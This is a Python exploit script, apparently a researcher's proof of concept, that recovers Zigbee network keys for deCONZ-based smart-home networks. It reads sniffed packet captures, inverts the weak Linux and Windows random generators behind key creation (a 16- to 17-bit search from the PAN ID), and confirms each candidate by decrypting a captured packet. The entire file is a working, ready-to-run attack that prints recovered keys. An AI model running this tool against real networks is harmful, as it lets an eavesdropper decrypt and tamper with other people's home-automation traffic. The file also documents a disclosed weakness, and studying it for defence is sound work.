#!/usr/bin/env python3
from __future__ import annotations

import sys

import typing
import warnings
import itertools

import tqdm

print("Loading scapy", file=sys.stderr)
import scapy.all
import scapy.config
import scapy.packet
import scapy.layers.zigbee
import scapy.layers.dot15d4

import zigbee_crypt


scapy.config.conf.dot15d4_protocol = "zigbee"
scapy.config.conf.layers.filter(
    [
        scapy.layers.dot15d4.Dot15d4,
        scapy.layers.dot15d4.Dot15d4Data,
        scapy.layers.zigbee.ZigbeeSecurityHeader,
        scapy.layers.zigbee.ZigbeeNWK,
    ]
)

DRESDEN_ELEKTRONIK_PREFIX = 0x00212E0000000000
DRESDEN_ELEKTRONIK_MASK = 0xFFFFFF0000000000


def format_key(key: bytes) -> str:
    return ":".join(f"{b:02X}" for b in key)


class BaseLCG:
    multiplier: int
    increment: int
    modulus: int

    def __init__(self, seed: int):
        self.state = seed & 0xFFFFFFFF

    def transform(self, state: int) -> int:
        return self.state

    def __next__(self) -> int:
        self.state = (self.state * self.multiplier + self.increment) % self.modulus
        return self.transform(self.state)

    def __iter__(self):
        return self


class ParkMillerLCG(BaseLCG):
    multiplier = 48271
    increment = 0
    modulus = 0x7FFFFFFF  # prime


class WindowsLCG(BaseLCG):
    multiplier = 214013  # relatively prime to modulus
    increment = 2531011
    modulus = 0x80000000  # prime power

    def transform(self, state: int) -> int:
        return (state >> 16) & 0x7FFF


def compute_key(rng: BaseLCG) -> bytes:
    """
    Computes the network key with the provided LCG with the algorithm used by the
    deCONZ REST plugin.

    Note that even with a strong random number generator (which does not leak its
    internal state), the conversion to hex ASCII effectively reduces the key size to 64
    bits, from the expected 128 bits.
    """

    # The first output is used to generate the PAN ID. We skip it.
    next(rng)

    # Leading zeroes are skipped: [0x01, 0x20, 0x03] becomes the ASCII string "1203"
    parts = [f"{next(rng):x}".encode("ascii") for _ in range(4)]

    # If the first two outputs are large enough (i.e. both > 0x10000000), converting
    # them both to ASCII will use all 16 bytes. Thus, there is an 88% chance that the
    # last two values returned by the RNG will never affect the key.
    return b"".join(parts).ljust(16, b"\x00")[:16]


def iter_key_candidates_linux(pan_id: int) -> typing.Iterator[bytes]:
    """
    Brute-force the internal LCG state given the PAN ID and yield all possible keys.
    The search space is 16 bits.
    """

    mult_inv = pow(ParkMillerLCG.multiplier, -1, ParkMillerLCG.modulus)

    # Brute force the upper half of the 32-bit LCG state
    for upper in tqdm.tqdm(range(0x0000, 0xFFFF + 1), unit=" keys", unit_scale=True):
        state = (upper << 16) | pan_id
        seed_candidate = (state * mult_inv) % ParkMillerLCG.modulus

        yield compute_key(ParkMillerLCG(seed_candidate))


def iter_key_candidates_windows(pan_id: int) -> typing.Iterator[bytes]:
    """
    Brute-force the internal LCG state given the PAN ID and yield all possible keys.
    The Windows search space is 17 bits.
    """

    mult_inv = pow(WindowsLCG.multiplier, -1, WindowsLCG.modulus)

    for high, lower in tqdm.tqdm(
        # Brute force both the high bit and the lower 16 bits
        iterable=itertools.product((0x8000, 0x0000), range(0x0000, 0xFFFF + 1)),
        unit=" keys",
        unit_scale=True,
        total=2 ** (1 + 16),
    ):
        state = ((pan_id | high) << 16) | lower
        state = (state - WindowsLCG.increment) % WindowsLCG.modulus
        seed_candidate = (state * mult_inv) % WindowsLCG.modulus

        yield compute_key(WindowsLCG(seed_candidate))


def validate_key(packet: scapy.layers.dot15d4.Dot15d4, key: bytes) -> bool:
    """
    Returns whether or not the key can decrypt the provided packet.

    This is a slightly optimized version of `killerbee.scapy_extensions.kbdecrypt`.
    """

    # XXX: this mutates the packet
    packet.nwk_seclevel = 5
    packet.data += packet.mic
    packet.mic = packet.data[-4:]
    packet.data = packet.data[:-4]

    if scapy.layers.zigbee.ZigbeeAppDataPayload in packet:
        payload = packet[scapy.layers.zigbee.ZigbeeAppDataPayload].do_build()
        epid = packet[scapy.layers.zigbee.ZigbeeNWK].ext_src
    else:
        payload = packet[scapy.layers.zigbee.ZigbeeNWK].do_build()
        epid = packet[scapy.layers.zigbee.ZigbeeSecurityHeader].source

    trim_size = len(packet.mic) + len(packet.data)
    payload = payload[:-trim_size]

    sec_ctrl_byte = bytes(packet[scapy.layers.zigbee.ZigbeeSecurityHeader])[0:1]
    nonce = (
        epid.to_bytes(8, "little")
        + packet[scapy.layers.zigbee.ZigbeeSecurityHeader].fc.to_bytes(4, "little")
        + sec_ctrl_byte
    )
    encrypted = packet.data

    with warnings.catch_warnings():
        warnings.filterwarnings("ignore", category=DeprecationWarning)
        _, mic_valid = zigbee_crypt.decrypt_ccm(
            key, nonce, packet.mic, encrypted, payload
        )

    return mic_valid == 1


def extract_unique_deconz_packets(
    reader: scapy.all.PcapReader,
) -> typing.Iterable[tuple[int, scapy.layers.dot15d4.Dot15d4]]:
    seen_networks = set()

    for packet in reader:
        # We can only work with encrypted packets
        try:
            sec_hdr = packet[scapy.layers.zigbee.ZigbeeSecurityHeader]
        except IndexError:
            continue

        pan_id = packet[scapy.layers.dot15d4.Dot15d4Data].dest_panid
        nwk = packet[scapy.layers.zigbee.ZigbeeNWK]

        # Need the EPID to check for a deCONZ IEEE
        if "extended_src" not in nwk.flags:
            continue

        if nwk.ext_src & DRESDEN_ELEKTRONIK_MASK != DRESDEN_ELEKTRONIK_PREFIX:
            continue

        if pan_id in seen_networks:
            continue

        seen_networks.add(pan_id)

        yield pan_id, packet


def validate_key_helper(
    packet_and_key: tuple[scapy.layers.dot15d4.Dot15d4, bytes]
) -> tuple[bool, bytes]:
    packet, key = packet_and_key
    return validate_key(packet, key), key


def find_deconz_network_key(packet: scapy.layers.dot15d4.Dot15d4) -> bytes | None:
    for key in itertools.chain(
        iter_key_candidates_linux(pan_id),
        iter_key_candidates_windows(pan_id),
    ):
        if validate_key(packet, key):
            return key
    else:
        return None


if __name__ == "__main__":
    print("Reading packets from", sys.argv[1], file=sys.stderr)

    with scapy.all.PcapReader(sys.argv[1]) as reader:
        for pan_id, packet in extract_unique_deconz_packets(reader):
            print(f"Found deCONZ network 0x{pan_id:04X}", file=sys.stderr)
            key = find_deconz_network_key(packet)

            if key:
                print(f"Network key for 0x{pan_id:04X}: {format_key(key)}")
            else:
                print(f"Network key for 0x{pan_id:04X}: not found")
